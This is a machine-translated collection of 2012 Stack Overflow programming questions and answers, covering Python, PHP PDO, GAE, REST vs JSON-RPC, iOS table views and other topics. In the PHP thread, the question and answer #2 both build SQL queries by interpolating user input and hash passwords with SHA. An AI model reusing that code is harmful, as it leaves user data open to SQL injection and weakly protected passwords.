
`print()`只输出到控制台，仅此而已。如果你想写入文件，那么就这样做。

您需要在循环内写入数据，否则您只会写入的最后一个值`text`：

```
import glob

with open('output.txt', 'w') as file:
    for filename in glob.glob('*.txt'):
        file.write(filename+'\n') 
```

请注意我添加的换行符`file.write()`，默认情况下不会这样做。如果您愿意，您自然也可以这样做`print()`。另一种选择是建立一个列表，然后将项目列表写入文件，但这有点迂回。

请注意我使用该`with`语句打开文件，这会为您关闭文件，即使出现异常也会这样做，因此保持代码更具可读性和彻底性是一种好习惯。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-31T23:08:20.193

这是我使用现代 Python 的方法。

```
from __future__ import print_function

import glob

with open("output.txt", "w") as fo:
    for name in glob.glob("*.txt"):
        print(name, file=fo) 
```

这会将循环放在上下文管理器中并使用前向兼容的打印功能。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-31T22:10:11.750

大多数已经正确提出的解决方案都涉及使用`file`'`write`方法，所以这里有一个替代方法，只使用`print`.

`print`语句 (/!\ python 2.x) 提供了一种写入文件的简单方法：

```
with open('myfile.txt', 'w') as f:
    print >> f, 'StuffToWrite' 
```

或者你可以`sys.stdout`用你的文件替换：

```
import sys
with open('myfile.txt', 'w') as f:
    sys.stdout = f
    print 'StuffToWrite' 
```

作为参考，您始终可以`stdout`在`sys.__stdout__`.

* * *

然而，让我坚持这样一个事实，即这些都是快速而肮脏的解决方案。
主要优点是你**不必担心你试图写的东西不兼容`write`**，`print`魔法会起作用（所以`print >> f, [1,2,3,4]`会起作用，什么时候`f.write([1,2,3,4])`不会）。

# reporting - 创建节和小节标题 BIRT 交叉表

> ID：13167858
> 
> 赞同：1
> 
> 时间：2012-10-31T21:41:54.240
> 
> 标签：reporting, birt, crosstab

我正在使用 BIRT v.3.7.2。我正在尝试创建一个包含部分标题、子部分标题和详细信息行的报告。我创建节标题和详细信息行没有问题，这是让我失望的小节标题。

报告将采用以下格式

```
第 1 节 状态 #
 第 1 小节 NC ND NE NH NJ
   问题1 结果 结果 结果 结果 结果
   问题 2 结果 结果 结果 结果 结果
 第 2 小节 NC ND NE NH NJ
  问题3 结果 结果 结果 结果 结果
  问题 4 结果 结果 结果 结果 结果

第 2 节 状态
  第 3 款 NC ND NE NH NJ
   问题 5 结果 结果 结果 结果 结果
   问题 6 结果 结果 结果 结果 结果
  第 4 小节 NC ND NE NH NJ
   问题 7 结果 结果 结果 结果 结果
   问题 8 结果 结果 结果 结果 结果

```

正如我所说，如果没有小节标题，这不会是一个问题，但无论我似乎对格式化做什么，我都会得到重复的小节或空节信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T01:20:57.560

所以这个问题的答案是不使用交叉表来完成这一切。

我首先将查询拆分为 2 个查询。一个获取部分、小节和问题编号和问题文本。

然后我创建了一个来获取每个结果的问题编号、相关结果和区域。

然后，我使用第一个查询照常创建表，其中 1 个组的标题行用于节标题，第二组具有节标题用于小节。然后我将问题编号和问题文本放在详细信息行中。如果我不需要动态列，这就是我通常会做的所有事情。

接下来，我根据第二个查询的结果创建了一个数据立方体。这些组是地区和问题编号。总结就是结果。

然后我创建了一个交叉表并将其添加到详细信息行第二列的表中。我让区域定义列，问题编号定义行。结果进入摘要部分。

这让我很接近，但不是一直。这篇文章 [http://www.eclipse.org/forums/index.php/t/272293/] 让我完成了剩下的工作。它声明的是您必须过滤交叉表。所以我添加了一个过滤器，用于何时交叉表问题编号 = 外部表问题编号。

这让我得到了我的结果，就像上面所说的那样。

# cryptography - 两个相同的 sha1 具有不同内容的可能性有多大？

> ID：13167860
> 
> 赞同：0
> 
> 时间：2012-10-31T21:42:13.023
> 
> 标签：cryptography, sha1

> **可能重复：**
> [SHA1 冲突的概率](https://stackoverflow.com/questions/1867191/probability-of-sha1-collisions)

假设我正在尝试识别文件系统中的重复文件。可以肯定地说，如果文件的 SHA1 校验和匹配，它们是相同的吗？如果它们匹配，我是否也应该查看它们的内容？

我读过攻击的理论复杂性是 2^51 哈希函数调用。我还在[SO](https://stackoverflow.com/questions/1147830/understanding-sha-1-collision-weakness)上读到“对于输出 160 位的 SHA1，生日攻击将复杂性降低到 2^80。这应该是安全的 30 年或更长时间。” 我还应该仔细检查以确保文件内容匹配吗？我只是想确保我的作业在测试脚本下运行时不会产生错误的输出。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:49:03.607

两条给定消息具有相同散列的可能性为 2^160 分之一（因为 SHA-1 产生 160 位散列）。

即使您的文件系统中有一百万个条目，新条目共享相同哈希的机会仍然是 10^42 分之一。

SHA-1 已被证明相当不错，所以我认为您根本不需要担心碰撞。如果您需要更多，您可以添加一些质量属性，例如时间戳、文件大小..

# java - Opera 无法加载托管在西里尔文域上的 GWT 应用程序

> ID：13167863
> 
> 赞同：0
> 
> 时间：2012-10-31T21:42:18.873
> 
> 标签：java, gwt, tomcat, dns

应用程序加载没有任何其他浏览器的麻烦。但是在 Opera 中，如果我们通过西里尔域名访问应用程序，则该应用程序不会加载任何动态数据。如果我们使用 Opera 通过它的 ip 地址访问应用程序，它会很好地加载。无法得到这种行为的原因。

日志：

```
127.0.0.1 - - [01/Nov/2012:00:17:42 +0400] "GET /SomeApp/ HTTP/1.1" 200 6222
127.0.0.1 - - [01/Nov/2012:00:17:42 +0400] "GET /SomeApp/res/js/tiny_mce/tiny_mce.js HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:42 +0400] "GET /SomeApp/res/image/main/flag.gif HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:43 +0400] "GET /SomeApp/res/image/main/logo.gif HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:43 +0400] "GET /SomeApp/res/image/main/footer-line.jpg HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:43 +0400] "GET /SomeApp/SomeApp/SomeApp.nocache.js HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:42 +0400] "GET /SomeApp/res/js/tiny_mce/tiny_mce.js HTTP/1.1" 304 -
127.0.0.1 - - [01/Nov/2012:00:17:42 +0400] "GET /SomeApp/favicon.ico HTTP/1.1" 404 1021
127.0.0.1 - - [01/Nov/2012:00:17:43 +0400] "GET /SomeApp/SomeApp/D6F91CB485BE21BEBB0994EBE42E6F73.cache.html HTTP/1.1" 304 - 
```

# python - 在 Google App Engine 上使用 python 使用 POST 方法处理 HTML 表单数据

> ID：13167865
> 
> 赞同：1
> 
> 时间：2012-10-31T21:42:19.903
> 
> 标签：python, web-services, google-app-engine, cgi

尝试在 Google App Engine 上开发一个 Python 网络服务，该服务将处理从 HTML 表单发布的数据。有人可以告诉我我做错了什么吗？桌面上同一目录中的所有文件\helloworld。

操作系统：Win 7 x64 Python 2.7 Google App Engine（本地）

你好世界.py

```
import webapp2
import logging
import cgi

class MainPage(webapp2.RequestHandler):

  def post(self):
    self.response.headers['Content-Type'] = 'text/plain'
    form = cgi.FieldStorage()
    if "name" not in form:
      self.response.write('Name not in form')
    else:
      self.response.write(form["name"].value)

app = webapp2.WSGIApplication([('/', MainPage)],debug=False) 
```

page.html

```
<html>
<body>
  <form action="http://localhost:8080" method="post">
    Name: <input type="text" name="name"/>
    <input type="submit" value="Submit"/>
  </form>
</body>
</html> 
```

使用浏览器（Chrome）查看 page.html，我在字段中输入文本并按提交，我希望看到文本显示在浏览器中，但我得到“名称不在表单中”。如果我将 HTML 表单方法更改为 get 并将 python 函数更改为 def get(self)，它会起作用，但我想使用 post 方法。任何有关解释的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:55:34.083

你不应该使用`cgi.FieldStorage`. Webapp2 与所有 Web 框架一样，具有处理 POST 数据的内置方式：在这种情况下，它是通过`request.POST`. 所以你的代码应该是：

```
if "name" not in self.request.POST:
    self.response.write('Name not in form')
else:
    self.response.write(self.request.POST["name"]) 
```

请参阅[webapp2 文档](http://webapp-improved.appspot.com/guide/request.html#post-data)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-02T11:55:44.533

最好不要放网址之类的

> “http://localhost:8080”

如果你使用类似的东西

> **动作="/"**

它可以在本地网络服务器（localhost:8080）和公共网络服务器（... .appspot.com）中工作

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:56:22.193

你为什么不试试：

```
name = self.request.get('name') 
```

*[来源](http://webapp-improved.appspot.com/guide/request.html)*

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T22:33:48.407

在入门指南中有一个使用表单并将结果提交到数据存储区的完整示例：[https ://developers.google.com/appengine/docs/python/gettingstartedpython27/usingdatastore](https://developers.google.com/appengine/docs/python/gettingstartedpython27/usingdatastore)

处理 html 输出的更好方法是使用 jinja 2。另请参阅入门指南。 [https://developers.google.com/appengine/docs/python/gettingstartedpython27/templates](https://developers.google.com/appengine/docs/python/gettingstartedpython27/templates) 在这之后看看 WTForms。

# php - Web 服务 - REST 与 PHP JSON RPC

> ID：13167867
> 
> 赞同：6
> 
> 时间：2012-10-31T21:42:34.493
> 
> 标签：php, json, api, rest, rpc

我正在做一个项目，我试图公开软件的功能。基本上我已经设置了后端，并且正在考虑使用 JSON msgs 将前端与后端代码分开。我对服务和 API 之间的区别有点困惑。我知道 API 可以建立在服务之上。但我想到了这两个模型——使用 json-rpc 访问配置文件 X

[http://xyz.com/?request=](http://xyz.com/?request=) {"jsonrpc":"2.0","id":1,"method":"getProfile","params":{"id":"X"}}

还是应该像这样使用 REST -

[http://api.xyz.com/X](http://api.xyz.com/X)

谢谢你

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-10-31T22:29:31.240

“服务”与“API”是一个相当模糊的问题。通常，这两个术语可以互换使用。“REST”与“RPC”更容易解释。

通常使用 REST，URL 代表特定资源，例如“用户”、“帐户”等。通常，您可以使用 HTTP 方法 POST/GET/PUT/DELETE 创建/检索/更新/删除这些资源. 要更新用户 1125 的配置文件，您可以发送以下内容：

```
POST /user/1125 HTTP/1.1
Host: wherever.com
Content-type: application/x-www-form-urlencoded

firstName=Davey&lastName=Jones&email=dj%40thebrineydeep.com 
```

您想对用户 1125 执行的任何操作都将向同一 URL 发送请求。这个想法有例外和变体，但这就是它的症结所在。

RPC 服务更像是使用一个函数库，它绑定到一个特定的 URL。您可能有一大堆相关函数都绑定到 URL `/services/json`。然后，如果您想更改老戴维琼斯的个人资料，您可以：

```
POST /services/json HTTP/1.1
Host: wherever.com
Content-type: application/json

{ "jsonrpc": "2.0",
  "id": 1,
  "method": "setProfile",
  "params": [ 1125,
    { "firstName": "Davey",
      "lastName": "Jones",
      "email": "dj@thebrineydeep.com"
    }
  ]
} 
```

我个人更喜欢 JSON-RPC，因为：

*   我不必尝试将我的所有函数调用都放入某种可能没有意义的资源到 URL 的映射中
*   我们不会尝试重载 HTTP 响应代码来指示 API 错误。每个请求都会返回一个 200 响应（除非存在服务器错误），并且您可以从响应正文中知道您是否收到错误。JSON-RPC 特别擅长明确错误条件。

有时 REST 更好，因为：

*   有时资源到 URL 的映射非常适合
*   第三方理解更直观
*   它提供了一个更简单的模型，仅用于检索易于识别的信息

我不认为任何一个都更容易编码。

**编辑**我更改了 REST 示例以使用更常见的表单编码数据而不是 JSON。当然，您可以使用 REST 指定您喜欢的任何数据格式。它不是刻在石头上的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:04:28.433

您的 REST URL 不等于您的 JSON-RPC 请求。

至少应该是[http://api.example.org/getProfile?id=X](http://api.example.org/getProfile?id=X)

两者之间确实没有太大区别。而且您的“REST”不是真正的 REST，除非您返回的数据格式能够可靠地表达指向不同 URL 的链接，例如 XML 或 (X)HTML。在满足此要求之前，您应该只将其称为“RESTful”，因为您实际上只使用 HTTP 方法来触发内容和来回移动数据。

你使用什么并不重要——除非你知道或有使用支持你比另一个更快地构建一个或另一个解决方案的软件的经验。

# java - 什么是线程安全的 ByteArrayOutputStream？

> ID：13167870
> 
> 赞同：8
> 
> 时间：2012-10-31T21:42:46.767
> 
> 标签：java, groovy

我想从进程的输出和错误流中读取并将它们合并到一个文本流中。我的程序很时髦，如下所示：

```
def mergeStream = new ByteArrayOutputStream()
process.waitForProcessOutput(mergeStream, mergeStream) 
```

问题是 ByteArrayOutputStream 不是线程安全的，waitForProcessOutput() 会生成两个附加到 mergeStream 的线程。有我可以使用的线程安全变体吗？你还有什么建议我控制对mergeStream的访问？看起来在实践中，这个实现有时会删除字符。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:50:09.137

如果`process.waitForProcessOutput()`采用`OutputStream`as 参数，您可以简单地使用其所有方法同步的自定义实现`OutputStream`，并委托给对应的 Wrapped 方法`ByteArrayOutputStream`。就像`Collections.synchronizedList()`将另一个 List 包装到同步的 List 代理中一样。

编辑：

也就是说，读取 ByteArrayOutputStream 的源代码，它的所有方法都已经同步，因此它已经是线程安全的。您的错误可能来自其他地方。

# c# - 如何从 C# 中的 SRGS .grxml 文件中读取语义标签？

> ID：13167873
> 
> 赞同：1
> 
> 时间：2012-10-31T21:42:52.803
> 
> 标签：c#, xml, grammar, speech-recognition, semantics

假设我从下面的语法中有这个简单的部分：

```
<rule id="WhoAreYou" scope="private">
 <one-of>
  <item>who</item>
  <item>what</item>
 </one-of>
  <item>
    are
    you
  </item>
 <tag>1000</tag>
</rule> 
```

我如何从标签中适当地返回“1000”？我正在使用 System.Speech 库，并尝试将此值返回给使用 SpeechRecognizedEventArgs 的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:47:48.480

如果字符串中有 xml 的那部分，则可以将字符串解析为 LINQ to XML [XDocument](http://msdn.microsoft.com/en-us/library/system.xml.linq.xdocument%28v=vs.100%29.aspx)并`XDocument.Parse(string)`使用它来获取值。[在此处](http://msdn.microsoft.com/en-us/library/bb387098%28v=vs.100%29.aspx)阅读 LINQ to XML :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T12:06:04.597

我其实只是想通了。我使用的是 e.Result.Semantics.Value.ToString() ，它返回的文本与所说的完全相同。我意识到我已经设置了 tag-format="semantics-ms/1.0" 时将其设置为 tag-format="semantics/1.0" 解释了该标签。

# php - 检查条件下是否存在行（PDO，准备？？？）

> ID：13167880
> 
> 赞同：0
> 
> 时间：2012-10-31T21:43:20.620
> 
> 标签：php, pdo, mysqli

下面的代码表明我尝试使用代码中给出的标准来找出是否存在一行。它默认为 else 语句，*正确*，但如果 if 语句似乎为真（没有电子邮件为 ashfjks@sdhja.com），则不能与“if”语句一起使用，而是代码继续。这段代码的后半部分主要是对情况进行扩展。该行只能存在或不存在，所以我不明白为什么它不严格执行其中一个。我正在转换为站点安全的 PDO，这就是为什么不是所有的都在 PDO 中。如果这个问题过于本地化，我很抱歉？

```
$stmt = $pdo->prepare("SELECT * FROM table WHERE email = ?");
$stmt->execute(array("$email"));
$row3 = $stmt->fetch(PDO::FETCH_ASSOC);

while($row = $stmt->fetch()) {

  if ( ! $row3) {
    // Row3 doesn't exist -- this means no one in the database has this email, allow the person to join
    $query = "INSERT INTO table (username, email, password, join_date) VALUES ('$username', '$email', SHA('$password1'), NOW())";
    mysqli_query($dbc, $query); 
    $query = "SELECT * FROM table WHERE username = '$username'";
    $data2 = mysqli_query($dbc, $query);
  while ($row = mysqli_fetch_array($data2)) {

  $recipent = '' . $row['user_id'] . '';

    $query = "INSERT INTO messages (recipent, MsgTit, MsgR, MsgA, sender, time, readb, reada, MsgCon) VALUES ('$recipent', '$MsgTit', '$MsgR', '$MsgA', '$sender', NOW(), '$readb', '$reada', '$MsgCon')";
    mysqli_query($dbc, $query);

    // Aftermath.
    echo '<p>Your new account has been successfully created. You\'re now ready to <a href="game2.php" target="_blank">log in</a>. After this you should implement basic character-details on your users profile to begin the game.</p>';

    mysqli_close($dbc);
    exit();
  } }  
  else {
    // An account already exists for this email, so display an error message
    echo '<p class="error">An account already exists for this e-mail.</p>';
    $email = "";
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:57:03.083

+1 to answer from @Geoff_Montee, but here are a few more tips:

*   Make sure you check for errors after every prepare() or execute(). Report the error (but don't expose your SQL to the user), and fail gracefully.

*   Note that even though you checked for existence of a row matching $email, such a row could be created in the brief moment of time since your check and before you INSERT. This is a [race condition](http://en.wikipedia.org/wiki/Race_condition). Even if you SELECT for a row matching $email, you should also use a UNIQUE constraint in the database, and catch errors when you execute the INSERT in case the UNIQUE constraint blocks the insert due to conflict.

*   `SELECT email` instead of `SELECT *`. If you have an index on email, then the query runs more efficiently because it can just check the index for the given value, instead of having to read all the columns of the table when you don't need them. This optimization is called an *index-only query*.

*   Likewise use `SELECT user_id` instead of `SELECT *`. Use `SELECT *` only when you really need to fetch all the columns.

*   [Bcrypt is more secure than SHA for hashing passwords.](https://stackoverflow.com/questions/4795385/how-do-you-use-bcrypt-for-hashing-passwords-in-php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:57:42.677

Your `if` statement will never be executed. You need to check the number of rows returned. This is what you want:

**Note:** I originally used `$stmt->rowCount()`, but the OP said that didn't work for him. But I'm pretty sure the cause of that error was coming from somewhere else.

```
if (!($stmt = $pdo->prepare("SELECT * FROM table WHERE email = ?"))) {
   //error
}

if (!$stmt->execute(array("$email"))) {
    //error
}
//The $row3 var you had was useless. Deleted that.

$count = 0;

while ($row = $stmt->fetch()) {
    $count++;
}

//The query returned 0 rows, so you know the email doesn't exist in the DB
if ($count== 0) {

    $query = "INSERT INTO table (username, email, password, join_date) VALUES ('$username', '$email', SHA('$password1'), NOW())";

    if (!mysqli_query($dbc, $query)) {
        //error
    }

    $query = "SELECT * FROM table WHERE username = '$username'";

    if (!($data2 = mysqli_query($dbc, $query))) {
        //error
    }

    while ($row = mysqli_fetch_array($data2)) {

        $recipent = '' . $row['user_id'] . '';

        $query = "INSERT INTO messages (recipent, MsgTit, MsgR, MsgA, sender, time, readb, reada, MsgCon) VALUES ('$recipent', '$MsgTit', '$MsgR', '$MsgA', '$sender', NOW(), '$readb', '$reada', '$MsgCon')";

        if (!mysqli_query($dbc, $query)) {
            //error
        }

       // Aftermath.
       echo '<p>Your new account has been successfully created. You\'re now ready to <a href="game2.php" target="_blank">log in</a>. After this you should implement basic character-details on your users profile to begin the game.</p>';

       mysqli_close($dbc);
       exit();
   }
}
//The query did not return 0 rows, so it does exist in the DB
else {
    // An account already exists for this email, so display an error message
    echo '<p class="error">An account already exists for this e-mail.</p>';
    $email = "";
} 
```

And you should totally convert the rest of those queries to use PDO.

# python - 如何将列表分组为包含顺序的 n 元组

> ID：13167881
> 
> 赞同：2
> 
> 时间：2012-10-31T21:43:23.710
> 
> 标签：python, list, grouping

> **可能重复：**
> [在 Python 中将列表迭代为对（当前，下一个）](https://stackoverflow.com/questions/5434891/iterate-a-list-as-pair-current-next-in-python)

我有一个这样的列表：

```
list = [A, B, C, D, E, F, G] 
```

如何将其分组以获得以下 Python 输出

```
[(A,B), (B,C), (C, D), (D,E), (E,F), (F,G)] 
```

所以这些值按第二个值分组，但顺序被保留......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T21:45:45.237

尝试使用`zip()`：

```
zip(lst, lst[1:]) 
```

此外，您不应使用 name `list`，因为您将覆盖内置列表类型。

例子：

```
>>> lst = ['A', 'B', 'C', 'D', 'E', 'F', 'G']
>>> zip(lst, lst[1:])
[('A', 'B'), ('B', 'C'), ('C', 'D'), ('D', 'E'), ('E', 'F'), ('F', 'G')] 
```

对于可以与生成器或其他一次性迭代器一起使用的版本，您可以使用[itertools 文档中的成对配方](http://docs.python.org/2/library/itertools.html#recipes)：

```
from itertools import tee, izip

def pairwise(iterable):
    "s -> (s0,s1), (s1,s2), (s2, s3), ..."
    a, b = tee(iterable)
    next(b, None)
    return izip(a, b) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-31T21:45:40.010

```
>>> a = [1,2,3,4,5]
>>> zip(a, a[1:])
<zip object at 0x7fe6e905ab90>
>>> list(zip(a, a[1:]))
[(1, 2), (2, 3), (3, 4), (4, 5)] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-31T21:44:39.580

使用从 0 迭代到 length - 1 的列表推导

```
print [(a[i],a[i+1]) for i in range(len(a)-1)] 
```

甚至更好，只需使用 zip

```
print zip (a,a[1:]) 
```

# iphone - UITableView 的自定义背景图像，但 tableHeaderView 忽略它并保持透明？

> ID：13167887
> 
> 赞同：2
> 
> 时间：2012-10-31T21:44:15.130
> 
> 标签：iphone, ios, parallax, uitableview

坚持某事，我不确定它是否可能。有没有办法将 UITableView 的背景设置为自定义图像，但不要让该背景应用于 tableHeaderView。我的桌子上有一个需要保持透明的标题，因为我有一个视差类型效果（如路径 2 应用程序），它使用透明表格标题和表格视图顶部 1/3 后面的图像实现...但我需要在桌子的其余部分后面获取自定义图像。

我可以成功接近我正在寻找的填充每个单元格后面的背景样式，其中：

```
- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath 
```

但是，这不是我要找的，因为我想要屏幕上整个 tableview 后面的径向渐变背景视图，减去透明标题......不仅仅是每个单元格的相同图像。此外，这种方法确实影响了我的 tableview 的滚动性能，为每个单元格加载了一个新的 BG 图像。

我知道你可以使用：

```
 UIImageView *tempImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"image.png"]];
  [tempImageView setFrame:self.tableView.frame];

  self.tableView.backgroundView = tempImageView; 
```

为 tableview 设置 BG 图像，它真的很接近我想要做的，但我需要那个标题是透明的。有什么办法可以使用它，而且还告诉tableHeaderView忽略它并保持透明？谢谢大家，万圣节快乐！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T00:44:37.437

您是否有理由不能`tableHeaderView`成为您希望具有视差类型效果的图像的容器？

创建一个`UIView`并将其粘贴为 的`tableHeaderView`，`UITableView`然后将您的`UIImageView`（或其他）添加到该`tableHeaderView`。使用`UIScrollView`的委托方法，您将能够`UIView`根据用户滚动在其父视图中随意重新定位它。

请参阅此开源项目以获取受路径启发的视差`UITableView`：[RBParallaxTableViewController](http://www.cocoacontrols.com/platforms/ios/controls/rbparallaxtableviewcontroller)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T03:34:57.800

是的你可以。我为分组的视差效果实现了一个解决方案`UITableView`。您可以使用相同的方法，除了可以使用您的图像而不是黑色背景（下面的示例）。本质上，您在 tableview 后面有两个视图（很清晰，标题视图背景清晰以及表格视图背景本身）。您基于滚动 ( `UIScrollViewDelegate`) 移动这两个视图。您的表格视图背景图像将与表格以一对一的方式“滚动”，而视差图像当然将以不同的速度“滚动”。在下面的示例中，我认为我的“ `_secondParaView`”将是表格的背景图像。

首先，在 viewDidLoad 中，创建一个视图以部分隐藏您的图像以获得视差效果，应该与您希望 tableview 的背景颜色相同，在我的情况下为 blackColor。我根据图像的大小将视图放置在固定偏移处，您希望此视图的顶部与“第 0 节”标题视图的末端顶部对齐。然后它会在 tableview 滚动时“滚动”。将此视图插入到 tableview 下方。

```
_secondParaView = [[UIView alloc] initWithFrame: CGRectMake(0.0, kTableViewOffset, self.view.frame.size.width, 200.0)];
_secondParaView.backgroundColor = [UIColor colorWithRed: 0.0 green: 0.0 blue: 0.0 alpha: 1.0];
[self.view insertSubview: _secondParaView belowSubview: _tableView];

_headerImageYOffset = -40.0;
_headerImageView = [[UIImageView alloc] initWithImage: [UIImage imageNamed: @"SpaceRedPlanet640x480.png"]];
CGRect headerImageFrame = _headerImageView.frame;
headerImageFrame.origin.y = _headerImageYOffset;
_headerImageView.frame = headerImageFrame;
[self.view insertSubview: _headerImageView belowSubview: _secondParaView];
_tableView.backgroundColor = [UIColor clearColor]; 
```

然后实现header view/header view size的两个分组tableview方法：

```
- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section {
    if (section == 0) {
        UIView * tableHeaderView = [[UIView alloc] initWithFrame: CGRectMake(0.0, 0.0, self.view.frame.size.width, kTableViewOffset)];
        tableHeaderView.backgroundColor = [UIColor clearColor];     
        return tableHeaderView;
    } else
        return nil;
}

- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section {
    if (section == 0) {
        return kTableViewOffset;
    } else 
        return 2;
} 
```

就像在“正常”的 tableview 视差实现中一样，让你的 VC 成为 UIScrollViewDelegate 并像这样实现这个 scrollViewDidScroll：

```
#pragma mark -
#pragma mark UIScrollViewDelegate methods
- (void)scrollViewDidScroll:(UIScrollView *)scrollView {
    CGFloat scrollOffset = scrollView.contentOffset.y;
    CGRect headerImageFrame = _headerImageView.frame;
    CGRect underParaFrame = _secondParaView.frame;

    if (scrollOffset < 0) {
        // Adjust top image proportionally
        headerImageFrame.origin.y = _headerImageYOffset - ((scrollOffset / 3));
    } else {
        // We're scrolling up, return to normal behavior
        headerImageFrame.origin.y = _headerImageYOffset - scrollOffset;
    }
    underParaFrame.origin.y = kTableViewOffset - scrollOffset;
    _headerImageView.frame = headerImageFrame;
    _secondParaView.frame = underParaFrame;
} 
```

希望这会有所帮助，或者至少可以帮助某人实现分组表视图的视差效果。我找不到解决办法。

# jquery - 在新选项卡中打开或重新加载时 Ajax 保留信息

> ID：13167888
> 
> 赞同：0
> 
> 时间：2012-10-31T21:44:22.507
> 
> 标签：jquery, ajax

我正在创建一个网站，当我将其放置在另一个选项卡中或刷新页面时，我需要保留该信息。

这是我需要保留信息的代码部分。

```
$(".dev").append(lines[i]+"\n"); 
```

lines[i] 是将在我的 textarea 中列出的 IP 地址。

```
<textarea class='dev' cols='50' rows='10' readonly='readonly' style='resize:none;'> 
```

现在，当在新选项卡中打开或刷新浏览器时，如何保留我的 textarea 中的信息？我以前使用过 memcache，但我不想使用我需要在 ajax 或 jquery 中执行它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:54:23.373

尝试使用本地存储。它们的工作方式类似于 cookie。

这是一篇关于 LS 使用的好文章： [http ://www.webmonkey.com/2011/04/how-to-use-html5s-local-storage-tools-today/](http://www.webmonkey.com/2011/04/how-to-use-html5s-local-storage-tools-today/)

但是，简而言之，您会像 cookie 一样保存信息：

```
myjsobj={
  one : 1,
  two : 2
}
localStorage.setItem('mylist',JSON.stringify(myjsobj)); 
```

并像这样检索它：

```
myRetrievedObject=jQuery.parseJSON(localStorage.getItem('mylist')); 
```

# html - 引导表单设计

> ID：13167896
> 
> 赞同：0
> 
> 时间：2012-10-31T21:44:52.603
> 
> 标签：html, css, forms, frameworks, twitter-bootstrap

我正在尝试使用[bootstrap](http://twitter.github.com/bootstrap/index.html)重新设计我的注册表单。我正在按照[此文档](http://twitter.github.com/bootstrap/base-css.html?#typography)将我已经完成的注册页面转换为基于引导程序的页面。我的注册页面分为 3 个部分，选项/信息/付款。但我希望页面像滑块一样相互滑动，您可以在其中来回移动。像[这样](http://jquerytools.org/demos/scrollable/wizard.html)的东西。那么如何将这个表格分成三部分并用引导程序相互滑动？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:49:10.060

我认为[Bootstrap Tabs](http://twitter.github.com/bootstrap/javascript.html#tabs)会做你需要的。

# ruby-on-rails - 使用 mongo_mapper 在 Rails 控制台中显示查询语句

> ID：13167897
> 
> 赞同：1
> 
> 时间：2012-10-31T21:44:53.007
> 
> 标签：ruby-on-rails, ruby-on-rails-3, mongomapper

和

```
ActiveRecord::Base.logger = Logger.new(STDOUT) 
```

您可以在 Rails 控制台中查看 SQL 语句，相关[here](http://www.shanison.com/2012/03/05/show-sql-statements-in-rails-console/)，但这需要 ActiveRecord ，使用 mongo_mapper 您没有 ActiveRecord，那么如何查看查询调试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-03T23:43:48.630

尽管这已经过时了，但我在这里为以后来看的任何人添加了答案。

基于[此](http://www.railstips.org/blog/archives/2009/10/09/more-mongomapper-awesomeness/)，答案很简单。在您的`config/initializers/mongo.rb`文件中更改您的连接字符串，如下所示：

```
logger = Logger.new(STDOUT)
MongoMapper.connection = Mongo::Connection.new('mongo.example.com', 27017, :logger => logger) 
```

重新启动 Rails，Mongo 查询字符串现在显示在记录器中。

# .net - 使用 .NET Compact Framework 时有什么理由我应该调用 Dispose()

> ID：13167898
> 
> 赞同：3
> 
> 时间：2012-10-31T21:44:57.097
> 
> 标签：.net, compact-framework, dispose

我最近接手了使用 .NET 紧凑型框架为移动设备编写的代码库的职责，我看到代码散布在`Dispose()`各处，到处都是调用。

这个好像开了

*   ADO.NET 数据库命令
*   Windows 窗体

我认为垃圾收集器会处理内存管理。我知道如果没有 ，他们可能会在记忆中停留更长时间`Dispose()`，但是有这些电话有很多好处或收获吗？它似乎污染了代码的整洁性。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T21:49:31.747

> 我知道如果没有 Dispose()，它们可能会在内存中停留更长时间，但是进行这些调用是否有很多优势或收益？我

这在很大程度上取决于*这些*调用所处置的内容。 `IDisposable`不是（必然）关于释放内存，而是关于释放资源。一般来说，你应该总是在对象上调用 Dispose，如果你的逻辑中没有巨大的障碍，并且除非必要，否则不要依赖 GC 来清理资源。

鉴于您在 CF 上运行，它可能更加关键。如果您的程序针对的是资源有限的平台，那么尽快清理这些资源非常重要。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:49:52.450

通常，但并非总是如此，调用 Dispose 是为了释放非托管资源。作为一种好的做法，应该为任何具有 Dispose 方法的类型调用 Dispose。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T22:11:51.490

